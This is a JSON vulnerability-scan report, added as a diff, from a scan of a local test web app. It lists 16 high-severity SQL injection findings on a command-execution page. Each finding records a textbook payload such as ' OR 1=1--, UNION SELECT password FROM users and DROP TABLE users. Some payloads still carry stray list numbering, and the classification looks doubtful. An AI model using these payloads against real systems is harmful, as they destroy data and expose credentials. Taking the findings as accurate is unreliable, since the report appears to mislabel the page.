@@ -1,0 +1,175 @@
+{
+  "scan_id": "scan_1773663992",
+  "status": "COMPLETED",
+  "target_url": "http://localhost:45/index.php",
+  "start_time": 1773663994.9348202,
+  "end_time": 1773664005.0305269,
+  "elapsed_time": 10.095706701278687,
+  "pages_crawled": 15,
+  "vulnerabilities_found": 16,
+  "vulnerabilities": [
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/exec/",
+      "parameter": "ip",
+      "payload": "2. '; DROP TABLE users;--",
+      "method": "POST",
+      "severity": "High",
+      "description": "SQL injection vulnerability in ip parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/exec/",
+      "parameter": "ip",
+      "payload": "1. ' OR 1=1--",
+      "method": "POST",
+      "severity": "High",
+      "description": "SQL injection vulnerability in ip parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/exec/",
+      "parameter": "ip",
+      "payload": "4. '); SELECT * FROM information_schema.tables;--",
+      "method": "POST",
+      "severity": "High",
+      "description": "SQL injection vulnerability in ip parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/exec/",
+      "parameter": "ip",
+      "payload": "3. %' UNION SELECT password FROM users--",
+      "method": "POST",
+      "severity": "High",
+      "description": "SQL injection vulnerability in ip parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/exec/",
+      "parameter": "ip",
+      "payload": "' OR '1'='1",
+      "method": "POST",
+      "severity": "High",
+      "description": "SQL injection vulnerability in ip parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/exec/",
+      "parameter": "ip",
+      "payload": "1' UNION SELECT null--",
+      "method": "POST",
+      "severity": "High",
+      "description": "SQL injection vulnerability in ip parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/exec/",
+      "parameter": "ip",
+      "payload": "5. SELECT * FROM information_schema.columns WHERE table_name = 'users'--",
+      "method": "POST",
+      "severity": "High",
+      "description": "SQL injection vulnerability in ip parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/exec/",
+      "parameter": "ip",
+      "payload": "'",
+      "method": "POST",
+      "severity": "High",
+      "description": "SQL injection vulnerability in ip parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/exec/",
+      "parameter": "Submit",
+      "payload": "2. '; DROP TABLE users;--",
+      "method": "POST",
+      "severity": "High",
+      "description": "SQL injection vulnerability in Submit parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/exec/",
+      "parameter": "Submit",
+      "payload": "1. ' OR 1=1--",
+      "method": "POST",
+      "severity": "High",
+      "description": "SQL injection vulnerability in Submit parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/exec/",
+      "parameter": "Submit",
+      "payload": "4. '); SELECT * FROM information_schema.tables;--",
+      "method": "POST",
+      "severity": "High",
+      "description": "SQL injection vulnerability in Submit parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/exec/",
+      "parameter": "Submit",
+      "payload": "3. %' UNION SELECT password FROM users--",
+      "method": "POST",
+      "severity": "High",
+      "description": "SQL injection vulnerability in Submit parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/exec/",
+      "parameter": "Submit",
+      "payload": "' OR '1'='1",
+      "method": "POST",
+      "severity": "High",
+      "description": "SQL injection vulnerability in Submit parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/exec/",
+      "parameter": "Submit",
+      "payload": "1' UNION SELECT null--",
+      "method": "POST",
+      "severity": "High",
+      "description": "SQL injection vulnerability in Submit parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/exec/",
+      "parameter": "Submit",
+      "payload": "5. SELECT * FROM information_schema.columns WHERE table_name = 'users'--",
+      "method": "POST",
+      "severity": "High",
+      "description": "SQL injection vulnerability in Submit parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    },
+    {
+      "type": "SQL Injection",
+      "url": "http://localhost:45/vulnerabilities/exec/",
+      "parameter": "Submit",
+      "payload": "'",
+      "method": "POST",
+      "severity": "High",
+      "description": "SQL injection vulnerability in Submit parameter",
+      "recommendation": "Use parameterized queries or prepared statements"
+    }
+  ],
+  "report_generated": "2026-03-16T17:56:45.043170",
+  "report_version": "1.0.0",
+  "report_format": "json"
+}
